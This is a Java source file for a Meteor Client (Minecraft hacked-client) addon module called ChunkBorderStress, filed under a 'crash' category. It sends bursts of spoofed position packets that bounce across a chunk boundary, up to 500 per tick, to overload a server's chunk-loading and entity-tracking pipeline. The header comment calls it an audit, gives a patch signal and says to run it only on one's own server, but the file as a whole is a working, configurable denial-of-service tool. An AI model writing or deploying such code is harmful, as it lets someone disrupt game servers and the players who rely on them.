package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

/**
 * AUDIT: Chunk Border Stress
 *
 * Rapidly ping-pongs reported position across a chunk boundary (every 16 blocks)
 * within a single tick. Each crossing triggers chunk-load/visibility work on the
 * server: entity tracking updates, chunk subscriptions, mob-spawn checks, and
 * light updates — all per crossing. At high rates this stresses the chunk-loading
 * and entity-tracking pipelines without any single packet being technically
 * illegal.
 *
 * Patch signal: rate-limit cross-chunk movement (position deltas that jump chunk
 * boundaries faster than physics allow) and bound the number of chunk-crossing
 * events that can be processed per player per tick.
 *
 * Run against your OWN local server only.
 */
public class ChunkBorderStress extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> crossingsPerTick = sgGeneral.add(new IntSetting.Builder()
        .name("crossings-per-tick").description("Chunk-boundary crossings per tick.")
        .defaultValue(20).range(1, 500).sliderRange(1, 100).build()
    );
    private final Setting<Double> offset = sgGeneral.add(new DoubleSetting.Builder()
        .name("boundary-offset").description("Blocks either side of the chunk edge to ping-pong between.")
        .defaultValue(1.0).range(0.1, 8.0).sliderRange(0.1, 4.0).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;

    private boolean side = false;

    public ChunkBorderStress() {
        super(AddonTemplate.CRASH_CATEGORY, "chunk-border-stress",
            "Ping-pongs reported position across a chunk boundary rapidly. Tests chunk-load/entity-tracking pipeline under crossing pressure.");
    }

    @Override
    public void onActivate() { side = false; }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;

        // Snap to the nearest chunk edge (multiple of 16), then bounce ±offset
        double base = Math.round(mc.player.getX() / 16.0) * 16.0;
        double y = mc.player.getY();
        double z = mc.player.getZ();

        for (int i = 0; i < crossingsPerTick.get(); i++) {
            side = !side;
            double x = side ? base + offset.get() : base - offset.get();
            mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                x, y, z, true, false));
            packetsSent++;
        }
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
